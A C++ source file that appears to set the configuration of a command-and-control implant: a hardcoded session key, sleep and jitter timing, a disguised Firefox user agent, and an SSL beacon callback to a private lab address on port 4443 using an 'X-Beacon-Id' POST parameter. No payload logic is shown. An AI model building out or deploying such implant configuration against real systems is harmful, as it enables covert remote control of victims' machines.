#include "AgentConfig.h"
#include "utils.h"

AgentConfig::AgentConfig()
{
	agent_type          = 0x244829e7;
	exit_method         = 1;
	download_chunk_size = 128000;
	session_key         = (PBYTE)"\x0c\xff\x01\xb5\xfc\x46\x90\x57\x61\x98\x25\xe1\x87\x57\x21\x2e";
	sleep_delay         = 5;
	jitter_delay        = 0;

	// HTTP Config
	user_agent      = (PBYTE) "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Fire fox/20.0";
	use_ssl         = TRUE;
	port	        = 4443;
	address	        = (PBYTE) "172.16.196.1";
	uri             = (PBYTE) "/uri";
	ans_pre_offset  = 0;
	ans_post_offset = 0;
	param_name      = (PBYTE) "X-Beacon-Id";
	method          = (PBYTE) "POST";
	headers         = NULL;
}

AgentConfig::~AgentConfig()
{

}

void LoadConfig(BYTE* config)
{

}